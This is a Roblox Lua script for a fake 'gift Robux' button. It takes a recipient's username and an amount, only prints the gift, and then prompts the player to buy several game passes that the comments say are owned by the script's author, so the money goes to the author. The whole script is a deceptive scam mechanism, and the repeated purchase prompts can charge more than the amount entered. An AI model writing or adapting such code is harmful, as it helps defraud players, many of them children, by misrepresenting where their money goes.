local MarketplaceService = game:GetService("MarketplaceService")
local Players = game:GetService("Players")

local player = Players.LocalPlayer

-- Your Game Passes (owned by you, Apto03)
local gamePasses = {
    {id = 13600173502, price = 5},   -- 5 Robux pass
    {id = 12710204118, price = 10},  -- 10 Robux pass
    {id = 12714639371, price = 15},  -- 15 Robux pass
    {id = 12710201339, price = 20},  -- 20 Robux pass
}

local usernameBox = script.Parent.Parent:WaitForChild("UsernameBox")
local amountBox = script.Parent.Parent:WaitForChild("AmountBox")

local function promptGamePasses(amount)
    for _, pass in ipairs(gamePasses) do
        if pass.price <= amount then
            print("Prompting purchase for game pass with price: " .. pass.price)
            MarketplaceService:PromptGamePassPurchase(player, pass.id)
            wait(5)  -- pause so user can complete purchase prompt
        end
    end
end

script.Parent.MouseButton1Click:Connect(function()
    local targetUsername = usernameBox.Text
    local amount = tonumber(amountBox.Text)

    if targetUsername == "" then
        warn("Please enter a username.")
        return
    end

    if not amount or amount <= 0 then
        warn("Please enter a valid positive amount.")
        return
    end

    -- Display only: show who the "gift" is for and amount
    print("User wants to gift " .. amount .. " Robux to " .. targetUsername)

    -- Prompt purchases, but Robux goes to you (Apto03) because you own passes
    promptGamePasses(amount)
end)
